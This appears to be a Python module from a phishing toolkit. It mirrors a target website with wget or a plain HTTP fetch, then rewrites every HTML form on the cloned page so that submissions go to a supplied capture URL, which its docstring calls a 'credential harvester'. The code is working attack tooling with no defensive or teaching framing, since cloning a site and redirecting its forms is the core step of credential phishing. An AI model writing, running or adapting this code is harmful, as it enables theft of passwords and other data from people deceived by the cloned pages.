"""Website cloning tool"""
import subprocess
import logging
from pathlib import Path
import requests
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

def clone_website(url: str, output_dir: str, simple: bool = False) -> dict:
    """Clone a website using wget or simple fetch
    
    Args:
        url: Target URL to clone
        output_dir: Directory to save cloned site
        simple: Use simple fetch instead of full mirror
        
    Returns:
        dict with status and path
    """
    if simple:
        return _simple_clone(url, output_dir)
    
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        logger.info(f"Cloning {url} to {output_dir}")
        
        cmd = [
            "wget",
            "--mirror",
            "--convert-links",
            "--adjust-extension",
            "--page-requisites",
            "--no-parent",
            "--no-check-certificate",
            "-P", str(output_path),
            url
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300
        )
        
        if result.returncode == 0 or result.returncode == 8:
            return {
                "success": True,
                "path": str(output_path),
                "message": f"Website cloned successfully to {output_path}"
            }
        else:
            logger.warning(f"Full clone failed, trying simple clone")
            return _simple_clone(url, output_dir)
            
    except subprocess.TimeoutExpired:
        logger.warning(f"Full clone timed out, trying simple clone")
        return _simple_clone(url, output_dir)
    except Exception as e:
        logger.error(f"Clone failed: {e}")
        return _simple_clone(url, output_dir)

def _simple_clone(url: str, output_dir: str) -> dict:
    """Simple clone - just fetch the main page"""
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        logger.info(f"Simple cloning {url}")
        
        response = requests.get(url, timeout=30, verify=False)
        response.raise_for_status()
        
        parsed = urlparse(url)
        domain = parsed.netloc
        
        output_file = output_path / domain / "index.html"
        output_file.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        return {
            "success": True,
            "path": str(output_path),
            "file": str(output_file),
            "message": f"Page cloned to {output_file}"
        }
        
    except Exception as e:
        logger.error(f"Simple clone failed: {e}")
        return {
            "success": False,
            "error": str(e),
            "message": "Clone failed"
        }

def modify_forms(html_path: str, capture_url: str) -> dict:
    """Modify HTML forms to point to credential harvester"""
    try:
        from bs4 import BeautifulSoup
        
        with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
            soup = BeautifulSoup(f.read(), 'html.parser')
        
        forms = soup.find_all('form')
        modified_count = 0
        
        for form in forms:
            form['action'] = capture_url
            form['method'] = 'POST'
            modified_count += 1
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        return {
            "success": True,
            "modified_forms": modified_count,
            "message": f"Modified {modified_count} forms"
        }
        
    except Exception as e:
        logger.error(f"Form modification failed: {e}")
        return {
            "success": False,
            "error": str(e),
            "message": "Form modification failed"
        }
